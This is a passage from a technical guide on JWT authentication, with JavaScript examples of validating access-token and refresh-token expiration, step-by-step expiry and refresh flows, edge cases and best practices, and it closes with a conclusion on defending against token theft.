    // 2. Decode payload (without verification for expiration check)
    const payload = JSON.parse(base64UrlDecode(parts[1]));

    // 3. Check expiration claim
    const currentTime = Math.floor(Date.now() / 1000);
    const expirationTime = payload.exp;

    if (!expirationTime) {
      throw new Error('Token missing expiration claim');
    }

    if (currentTime >= expirationTime) {
      return {
        valid: false,
        error: 'Token expired',
        expiredAt: new Date(expirationTime * 1000)
      };
    }

    // 4. Check issued at (optional - ensure token not used before issued)
    if (payload.iat && currentTime < payload.iat) {
      return {
        valid: false,
        error: 'Token not yet valid'
      };
    }

    // 5. Verify signature (cryptographic verification)
    const isValidSignature = verifySignature(token, secretKey);
    if (!isValidSignature) {
      return {
        valid: false,
        error: 'Invalid token signature'
      };
    }

    // 6. Token is valid
    return {
      valid: true,
      payload: payload,
      expiresIn: expirationTime - currentTime // seconds until expiration
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

#### Refresh Token Expiration Check

Refresh token expiration depends on the implementation:

**Option 1: JWT-Based Refresh Token (Stateless)**

If the refresh token is also a JWT, expiration is checked the same way:

```javascript
function validateRefreshToken(refreshToken) {
  try {
    // Decode payload
    const payload = JSON.parse(base64UrlDecode(refreshToken.split('.')[1]));
    
    // Check expiration
    const currentTime = Math.floor(Date.now() / 1000);
    const expirationTime = payload.exp;

    if (currentTime >= expirationTime) {
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // Verify signature
    const isValidSignature = verifySignature(refreshToken, refreshTokenSecret);
    
    return {
      valid: isValidSignature,
      payload: payload
    };
  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

**Option 2: Database-Stored Refresh Token (Stateful)**

If refresh tokens are stored in a database, expiration is checked via database lookup:

```javascript
async function validateRefreshToken(refreshToken) {
  try {
    // 1. Look up token in database
    const tokenRecord = await db.refreshTokens.findOne({
      where: { token: hashToken(refreshToken) } // Store hashed version
    });

    if (!tokenRecord) {
      return {
        valid: false,
        error: 'Refresh token not found'
      };
    }

    // 2. Check if token is revoked
    if (tokenRecord.revoked === true) {
      return {
        valid: false,
        error: 'Refresh token revoked'
      };
    }

    // 3. Check expiration (stored in database)
    const currentTime = new Date();
    const expirationTime = tokenRecord.expiresAt;

    if (currentTime >= expirationTime) {
      // Optionally delete expired token
      await db.refreshTokens.destroy({
        where: { id: tokenRecord.id }
      });
      
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // 4. Check if token is still valid
    return {
      valid: true,
      userId: tokenRecord.userId,
      expiresAt: tokenRecord.expiresAt
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

**Option 3: Hybrid Approach (JWT + Database)**

Many systems use JWTs with database validation for revocation:

```javascript
async function validateRefreshToken(refreshToken) {
  try {
    // 1. Decode JWT to get claims
    const payload = JSON.parse(base64UrlDecode(refreshToken.split('.')[1]));
    
    // 2. Check JWT expiration
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime >= payload.exp) {
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // 3. Check database for revocation (even if JWT not expired)
    const tokenRecord = await db.refreshTokens.findOne({
      where: { 
        jti: payload.jti, // JWT ID claim
        userId: payload.sub 
      }
    });

    if (!tokenRecord || tokenRecord.revoked) {
      return {
        valid: false,
        error: 'Refresh token revoked'
      };
    }

    // 4. Verify signature
    const isValidSignature = verifySignature(refreshToken, refreshTokenSecret);
    
    return {
      valid: isValidSignature,
      payload: payload,
      tokenRecord: tokenRecord
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

#### Key Differences

| Aspect | Access Token | Refresh Token |
|--------|-------------|---------------|
| **Expiration Check** | Always from JWT `exp` claim | JWT `exp` claim OR database `expiresAt` |
| **Validation Location** | Every API request | Only during refresh request |
| **Revocation Check** | Usually not checked (stateless) | Often checked in database |
| **Performance** | Fast (no DB lookup) | May require DB lookup |
| **Typical Lifetime** | 5-60 minutes | Hours to days |

#### Important Notes

1. **Clock Skew**: Servers may allow a small time window (e.g., 60 seconds) to account for clock differences:
   ```javascript
   const clockSkew = 60; // seconds
   if (currentTime >= (expirationTime + clockSkew)) {
     // Expired
   }
   ```

2. **Not Before (nbf) Claim**: Some tokens include an `nbf` (not before) claim:
   ```javascript
   if (payload.nbf && currentTime < payload.nbf) {
     return { valid: false, error: 'Token not yet valid' };
   }
   ```

3. **Token Refresh Timing**: Clients often refresh before expiration:
   ```javascript
   // Refresh when 80% of lifetime has passed
   const timeUntilExpiry = expirationTime - currentTime;
   const tokenLifetime = expirationTime - payload.iat;
   if (timeUntilExpiry < (tokenLifetime * 0.2)) {
     // Refresh token proactively
   }
   ```

### What Happens When Access Token Expires

#### Scenario: Access Token Expires (Refresh Token Still Valid)

**Step-by-Step Flow:**

1. **User Makes Request**
   ```
   User clicks button → Browser sends API request
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (expired access token)
   ```

2. **Server Validates Token**
   ```javascript
   // Server checks expiration
   const currentTime = Math.floor(Date.now() / 1000);
   const expirationTime = payload.exp; // e.g., 1700000000
   
   if (currentTime >= expirationTime) {
     // Token is expired!
     return res.status(401).json({ 
       error: "Token expired",
       code: "TOKEN_EXPIRED"
     });
   }
   ```

3. **Client Receives 401 Response**
   ```javascript
   // Client detects 401 Unauthorized
   if (response.status === 401 && response.error === "TOKEN_EXPIRED") {
     // Access token expired - need to refresh
   }
   ```

4. **Automatic Token Refresh (Seamless)**
   ```javascript
   // Client automatically attempts refresh
   POST /refresh
   Cookie: refresh_token=eyJhbG... (still valid)
   
   // Server validates refresh token
   // - Checks expiration: still valid ✓
   // - Checks revocation: not revoked ✓
   // - Verifies signature: valid ✓
   ```

5. **New Access Token Issued**
   ```javascript
   // Server generates new access token
   const newAccessToken = generateAccessToken(user);
   
   // Returns new token
   {
     "access_token": "eyJhbG...", // New token
     "expires_in": 900            // 15 minutes
   }
   ```

6. **Retry Original Request**
   ```javascript
   // Client retries original request with new token
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (new access token)
   
   // Server validates: ✓ Valid
   // Server returns: Protected data
   ```

**User Experience:**
- ✅ Usually seamless - the refresh happens automatically
- ✅ No interruption - the user doesn't see a login screen
- ⚠️ Slight delay - one extra round-trip for refresh

**Visual Flow:**
```
User Action
    │
    ▼
API Request (expired access token)
    │
    ▼
401 Unauthorized
    │
    ▼
Automatic Refresh Request
    │
    ▼
New Access Token Issued
    │
    ▼
Retry Original Request (new token)
    │
    ▼
Success - Data Returned
```

### What Happens When Refresh Token Expires

#### Scenario: Refresh Token Expires

**Step-by-Step Flow:**

1. **Access Token Expires (as before)**
   ```
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (expired access token)
   
   Response: 401 Unauthorized - Token expired
   ```

2. **Client Attempts Refresh**
   ```javascript
   // Client tries to refresh
   POST /refresh
   Cookie: refresh_token=eyJhbG... (expired refresh token)
   ```

3. **Server Validates Refresh Token**
   ```javascript
   // Server checks refresh token expiration
   const currentTime = Math.floor(Date.now() / 1000);
   const refreshExpiration = refreshPayload.exp;
   
   if (currentTime >= refreshExpiration) {
     // Refresh token is expired!
     return res.status(401).json({
       error: "Refresh token expired",
       code: "SESSION_EXPIRED"
     });
   }
   
   // OR if database-stored:
   const tokenRecord = await db.refreshTokens.findOne(...);
   if (new Date() >= tokenRecord.expiresAt) {
     return res.status(401).json({
       error: "Session expired"
     });
   }
   ```

4. **Refresh Request Rejected**
   ```javascript
   // Server response
   HTTP/1.1 401 Unauthorized
   {
     "error": "Session expired",
     "code": "SESSION_EXPIRED",
     "message": "Please log in again"
   }
   ```

5. **Client Clears All Tokens**
   ```javascript
   // Client removes all stored tokens
   localStorage.removeItem('access_token');
   document.cookie = 'refresh_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC;';
   
   // Clear any in-memory tokens
   accessToken = null;
   ```

6. **User Redirected to Login**
   ```javascript
   // Client redirects to login page
   window.location.href = '/login';
   // OR show login modal
   showLoginModal();
   ```

**User Experience:**
- ❌ Interruption - user must log in again
- ❌ Session ends - all authentication state is cleared
- ⚠️ Data may be lost - unsaved work might be lost (depends on app)

**Visual Flow:**
```
User Action
    │
    ▼
API Request (expired access token)
    │
    ▼
401 Unauthorized
    │
    ▼
Automatic Refresh Attempt
    │
    ▼
Refresh Token Validation
    │
    ▼
Refresh Token EXPIRED
    │
    ▼
401 Unauthorized - Session Expired
    │
    ▼
Clear All Tokens
    │
    ▼
Redirect to Login Page
    │
    ▼
User Must Re-authenticate
```

### Comparison Table

| Aspect | Access Token Expires | Refresh Token Expires |
|--------|---------------------|----------------------|
| **What Happens** | Automatic refresh | User must log in again |
| **User Impact** | Seamless (usually) | Interruption |
| **Server Response** | 401 → Refresh succeeds | 401 → Refresh fails |
| **New Token Issued?** | Yes (new access token) | No |
| **Session Continues?** | Yes | No |
| **User Action Required** | None | Must re-authenticate |
| **Typical Frequency** | Every 15-60 minutes | Every 7-30 days |

### Edge Cases and Special Scenarios

#### 1. Access Token Expires During Active Use

```javascript
// User is actively using the app
// Access token expires mid-session

// Scenario A: Proactive Refresh (Best Practice)
// Client refreshes before expiration (e.g., at 80% of lifetime)
if (timeUntilExpiry < (tokenLifetime * 0.2)) {
  refreshToken(); // Refresh proactively
}
// Result: Seamless - user never sees interruption

// Scenario B: Reactive Refresh
// Client waits until 401, then refreshes
// Result: Slight delay but still seamless
```

#### 2. Refresh Token Expires While User Is Active

```javascript
// User has been active for 7 days
// Refresh token expires

// Next API request:
1. Access token expired → 401
2. Attempt refresh → Refresh token expired → 401
3. User must log in again

// Best Practice: Warn user before refresh token expires
if (refreshTokenExpiresIn < 24 * 60 * 60) { // Less than 24 hours
  showWarning("Your session will expire soon. Please save your work.");
}
```

#### 3. Multiple Tabs/Devices

```javascript
// User has app open in multiple tabs
// Access token expires in all tabs simultaneously

// Tab 1: Refreshes token successfully
// Tab 2: Also tries to refresh
// - If refresh token rotation: Tab 2's refresh might fail
// - If no rotation: Both tabs get new tokens

// Best Practice: Use token rotation to detect token theft
// If refresh token used twice → potential theft detected
```

#### 4. Network Issues During Refresh

```javascript
// Access token expires
// Client attempts refresh
// Network request fails (offline, timeout, etc.)

// Scenario A: Retry with backoff
retryRefreshWithBackoff(maxRetries: 3);

// Scenario B: Show error, allow manual retry
showError("Connection failed. Please try again.");

// Scenario C: Graceful degradation
// Some apps allow limited functionality with expired token
```

### Security Implications

**Access Token Expiration:**
- Limits exposure window if token is stolen
- Short lifetime (15-60 min) means stolen tokens become useless quickly
- Automatic refresh maintains user experience

**Refresh Token Expiration:**
- Forces periodic re-authentication
- Limits long-term unauthorized access
- If stolen, attacker has access until refresh token expires (days/weeks)

**Why Both Are Needed:**
- Access tokens: Short-lived for security, refreshed frequently
- Refresh tokens: Long-lived for UX, but can be revoked server-side

### Best Practices

1. **Proactive Refresh**: Refresh access tokens before expiration (e.g., at 80% of lifetime)
2. **Token Rotation**: Issue new refresh token on each refresh to detect theft
3. **Graceful Handling**: Handle expiration errors gracefully with retry logic
4. **User Warnings**: Warn users before refresh token expires
5. **Offline Handling**: Handle network failures during refresh gracefully

---

## Conclusion

JWT token theft represents a significant security threat to modern web applications due to the bearer nature of tokens and their widespread use. The attack can be executed through multiple vectors including XSS injection, man-in-the-middle attacks, browser malware, and compromised third-party scripts. However, implementing defense-in-depth strategies significantly reduces the risk.

The most effective protection combines:
- **Secure storage** using HttpOnly cookies with Secure and SameSite attributes
- **XSS prevention** through Content Security Policy and input sanitization
- **Transport security** with HTTPS enforcement and HSTS
- **Token design** using short-lived access tokens with refresh token rotation
- **Runtime protection** through token binding and behavioral monitoring

Organizations should prioritize these defenses based on their security requirements, implementing multiple overlapping protections to ensure that the failure of one layer doesn't result in complete compromise. Regular security audits, penetration testing, and staying current with evolving attack techniques and mitigation strategies remain essential for maintaining robust JWT security posture.

